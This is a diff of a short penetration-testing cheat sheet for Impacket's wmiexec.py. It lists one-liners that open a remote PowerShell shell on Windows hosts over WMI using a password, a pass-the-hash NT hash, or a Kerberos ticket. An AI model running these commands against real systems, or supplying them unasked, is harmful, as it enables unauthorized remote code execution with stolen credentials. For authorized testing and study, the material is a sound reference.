@@ -1,25 +1,24 @@
-# wmiexec (imp)
+# wmiexec.py (imp)
 
 % windows, impacket-exec
+#plateform/linux #target/remote #port/135 #protocol/wmi #cat/ATTACK/CONNECT
 
-## wmiexec (creds)
-#plateform/linux #target/remote #port/135 #protocol/wmi #cat/ATTACK/CONNECT  
-Execute a command shell without touching the disk or running a new service using DCOM
-
+## desc
 ```
-wmiexec.py -shell-type powershell '<domain_fqdn>/<user>:<password>'@<ip>
+Execute a command or semi-interactive shell without touching the disk or running a new service using WMI
 ```
 
-## pth (pth) 
-#plateform/linux #target/remote #port/135 #protocol/wmi #cat/ATTACK/CONNECT  
-
-Execute a command shell without touching the disk or running a new service using DCOM
-
-```
-wmiexec.py -shell-type powershell -hashes <nt_hash> <user>@<ip>
+## execute (creds)
+```bash
+wmiexec.py -debug -shell-type powershell <domain_fqdn>/<user>:'<password>'@<target_fqdn>
 ```
 
-## wmiexec (ptt)
+## execute (pth) 
+```bash
+wmiexec.py -debug -shell-type powershell -hashes <nt_hash> <user>@<target_fqdn>
 ```
-export KRB5CCNAME=<ccache>; wmiexec.py -shell-type powershell -dc-ip <dc_ip> -target-ip <ip> -no-pass -k <target_name>
+
+## execute (ptt)
+```bash
+KRB5CCNAME=<ccache>  wmiexec.py -debug -shell-type powershell -no-pass -k <target_fqdn>
 ```
